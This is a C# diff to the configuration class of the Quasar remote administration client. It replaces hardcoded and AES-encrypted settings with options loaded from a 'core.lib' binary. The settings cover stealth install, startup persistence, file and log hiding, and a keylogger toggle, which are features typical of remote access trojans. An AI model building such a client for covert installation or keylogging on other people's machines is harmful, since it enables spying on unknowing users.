@@ -5,7 +5,8 @@ using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using System.Windows.Forms;
-
+using Newtonsoft.Json;
+using Quasar.Common;
 namespace Quasar.Client.Config
 {
     /// <summary>
@@ -13,81 +14,40 @@ namespace Quasar.Client.Config
     /// </summary>
     public static class Settings
     {
-#if DEBUG
-        public static string VERSION = Application.ProductVersion;
-        public static string HOSTS = "localhost:4782;";
-        public static int RECONNECTDELAY = 500;
-        public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
-        public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
-        public static string SUBDIRECTORY = "Test";
-        public static string INSTALLNAME = "test.exe";
-        public static bool INSTALL = false;
-        public static bool STARTUP = false;
-        public static string MUTEX = "123AKs82kA,ylAo2kAlUS2kYkala!";
-        public static string STARTUPKEY = "Test key";
-        public static bool HIDEFILE = false;
-        public static bool ENABLELOGGER = false;
-        public static string ENCRYPTIONKEY = "CFCD0759E20F29C399C9D4210BE614E4E020BEE8";
-        public static string TAG = "DEBUG";
-        public static string LOGDIRECTORYNAME = "Logs";
-        public static string SERVERSIGNATURE = "";
-        public static string SERVERCERTIFICATESTR = "";
-        public static X509Certificate2 SERVERCERTIFICATE;
-        public static bool HIDELOGDIRECTORY = false;
-        public static bool HIDEINSTALLSUBDIRECTORY = false;
-        public static string INSTALLPATH = "";
-        public static string LOGSPATH = "";
-        public static bool UNATTENDEDMODE = true;
 
+        public static X509Certificate2 SERVERCERTIFICATE;
+        public static string INSTALLPATH;
+        public static string LOGSPATH;
+
+        public static string ENCRYPTIONKEY => _options.EncryptionKey;
+        public static string SERVERSIGNATURE => _options.ServerSignature;
+        public static string VERSION => _options.Version;
+        public static string HOSTS => _options.RawHosts;
+        public static string SUBDIRECTORY => _options.InstallSub;
+        public static string LOGDIRECTORYNAME => _options.LogDirectoryName;
+        public static string INSTALLNAME => _options.InstallName;
+        public static string MUTEX => _options.Mutex;
+        public static string STARTUPKEY => _options.StartupName;
+        public static string TAG => _options.Tag;
+        public static int RECONNECTDELAY => _options.Delay;
+        public static Environment.SpecialFolder SPECIALFOLDER => _options.SpecialFolder;
+        public static string DIRECTORY => Environment.GetFolderPath(SPECIALFOLDER);
+        public static bool INSTALL => _options.Install;
+        public static bool STARTUP => _options.Startup;
+        public static bool HIDEFILE => _options.HideFile;
+        public static bool ENABLELOGGER => _options.Keylogger;
+        public static bool HIDELOGDIRECTORY => _options.HideLogDirectory;
+        public static bool HIDEINSTALLSUBDIRECTORY => _options.HideInstallSubdirectory;
+        public static bool UNATTENDEDMODE => _options.UnattendedMode;
+        private static BuildOptions _options;
         public static bool Initialize()
         {
-            SetupPaths();
-            return true;
-        }
-#else
-        public static string VERSION = "";
-        public static string HOSTS = "";
-        public static int RECONNECTDELAY = 5000;
-        public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
-        public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
-        public static string SUBDIRECTORY = "";
-        public static string INSTALLNAME = "";
-        public static bool INSTALL = false;
-        public static bool STARTUP = false;
-        public static string MUTEX = "";
-        public static string STARTUPKEY = "";
-        public static bool HIDEFILE = false;
-        public static bool ENABLELOGGER = false;
-        public static string ENCRYPTIONKEY = "";
-        public static string TAG = "";
-        public static string LOGDIRECTORYNAME = "";
-        public static string SERVERSIGNATURE = "";
-        public static string SERVERCERTIFICATESTR = "";
-        public static X509Certificate2 SERVERCERTIFICATE;
-        public static bool HIDELOGDIRECTORY = false;
-        public static bool HIDEINSTALLSUBDIRECTORY = false;
-        public static string INSTALLPATH = "";
-        public static string LOGSPATH = "";
-        public static bool UNATTENDEDMODE = false;
-
-        public static bool Initialize()
-        {
-            if (string.IsNullOrEmpty(VERSION)) return false;
-            var aes = new Aes256(ENCRYPTIONKEY);
-            TAG = aes.Decrypt(TAG);
-            VERSION = aes.Decrypt(VERSION);
-            HOSTS = aes.Decrypt(HOSTS);
-            SUBDIRECTORY = aes.Decrypt(SUBDIRECTORY);
-            INSTALLNAME = aes.Decrypt(INSTALLNAME);
-            MUTEX = aes.Decrypt(MUTEX);
-            STARTUPKEY = aes.Decrypt(STARTUPKEY);
-            LOGDIRECTORYNAME = aes.Decrypt(LOGDIRECTORYNAME);
-            SERVERSIGNATURE = aes.Decrypt(SERVERSIGNATURE);
-            SERVERCERTIFICATE = new X509Certificate2(Convert.FromBase64String(aes.Decrypt(SERVERCERTIFICATESTR)));
+            _options=BuildOptions.FromBinary(File.ReadAllBytes("core.lib"));
+            if (string.IsNullOrEmpty(_options.Version)) return false;
+            SERVERCERTIFICATE = new X509Certificate2(Convert.FromBase64String(_options.ServerCertificate));
             SetupPaths();
             return VerifyHash();
         }
-#endif
 
         static void SetupPaths()
         {
@@ -100,7 +60,7 @@ namespace Quasar.Client.Config
             try
             {
                 var rsa= SERVERCERTIFICATE.GetRSAPublicKey();
-                return rsa.VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(ENCRYPTIONKEY)), Convert.FromBase64String(SERVERSIGNATURE),
+                return rsa.VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(_options.EncryptionKey)), Convert.FromBase64String(_options.ServerSignature),
                     HashAlgorithmName.SHA256,RSASignaturePadding.Pkcs1);
                 
             }
